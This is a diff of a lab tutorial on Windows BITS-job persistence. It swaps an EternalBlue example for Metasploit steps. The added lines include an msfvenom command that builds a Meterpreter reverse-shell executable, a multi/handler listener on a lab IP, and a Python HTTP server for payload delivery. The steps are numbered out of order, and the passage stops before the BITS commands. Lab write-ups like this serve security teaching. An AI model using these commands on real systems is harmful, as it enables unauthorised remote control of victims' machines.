@@ -27,25 +27,32 @@ Since BITS jobs are often allowed by host firewalls and do not create obvious ne
 ### 3.1. Lab Setup
 
 This attack is demonstrated in a controlled lab environment using VMware Workstation. The setup consists of:
-- **Attacker:** Kali Linux (running Metasploit Framework)
-- **Victim:** Windows 10 (BITS service enabled)
+- **Attacker:** Kali Linux : 192.168.1.131 (running Metasploit Framework)
+- **Victim:** Windows 10: (BITS service enabled)
 - **Network Configuration:** Host-only or bridged network mode to allow direct communication
 
 ### 3.2. Attack Execution
 
-#### Step 1: Gaining Initial Access
-
-The attacker first establishes access to the victim machine. This can be achieved using Metasploit’s exploit modules, such as:
+#### Step 1: Using Metasploit to create payload
+On Kali Linux, open a terminal and generate a malicious executable:
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_KALI> LPORT=4444 -f exe > /tmp/payload.exe
+```
+Now, set up a listener in Metasploit:
 ```bash
 msfconsole
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOST <victim-IP>
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker-IP>
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.131
+set LPORT 4444
 exploit
 ```
-Once access is obtained, the attacker deploys persistence via BITS jobs.
-
+This will start a reverse shell listener waiting for the victim to execute the malicious file.
+#### Step 3: Send Payload through Python HTTP Server
+```bash
+cd /tmp
+python3 -m http.server 8080
+```
 #### Step 2: Creating a Malicious BITS Job
 
 On the compromised Windows machine, the attacker executes PowerShell commands to create a persistent BITS job:
